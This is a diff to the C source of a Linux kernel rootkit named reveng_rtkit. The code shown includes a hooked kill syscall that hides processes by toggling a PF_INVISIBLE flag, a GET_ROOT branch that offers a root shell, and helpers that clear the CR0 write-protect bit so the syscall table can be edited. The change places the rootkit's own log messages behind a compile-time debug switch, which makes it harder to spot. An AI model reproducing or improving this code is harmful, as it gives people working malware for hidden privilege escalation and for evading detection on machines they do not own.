@@ -1,3 +1,4 @@
+#include "../../options.h"
 #include <linux/syscalls.h>     /* Needed to use syscall functions */
 #include <linux/slab.h>         /* kmalloc(), kfree(), kzalloc() */
 #include <linux/sched.h>        /* task_struct: Core info about all the tasks */
@@ -290,10 +291,14 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 
 			// XOR operation is used to hide and unhide process
 			task->flags = task->flags ^ PF_INVISIBLE;
+			#if ENABLE_DEBUG_MESSAGES == 0
 			printk(KERN_INFO "[*] reveng_rtkit: Hiding/unhiding pid: %d \n", pid);
+			#endif
 			break;
 		case GET_ROOT:
+			#if ENABLE_DEBUG_MESSAGES == 0
 			printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-> Offering root shell!!");
+			#endif
 			/*
 				In someway system() function alike kernel function present in linux kernel programming
 				is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
@@ -318,13 +323,17 @@ static inline void write_cr0_forced(unsigned long val)
 
 static inline void protect_memory(void)
 {
-	printk(KERN_INFO "[*] reveng_rtkit: (Memory protected): Regainig normal memory protection\n");
+	#if ENABLE_DEBUG_MESSAGES == 0
+	printk(KERN_INFO "[*] rootkit: (Memory protected): Regainig normal memory protection\n");
+	#endif
 	write_cr0_forced(cr0);	// Setting WP flag to 1 => read-only
 }
 
 static inline void unprotect_memory(void)
 {
-	pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
+	#if ENABLE_DEBUG_MESSAGES == 0
+	pr_info("[*] rootkit: (Memory unprotected): Ready for editing Syscall Table");
+	#endif
 	write_cr0_forced(cr0 & ~0x00010000);	// Setting WP flag to 0 => writable
 }
 
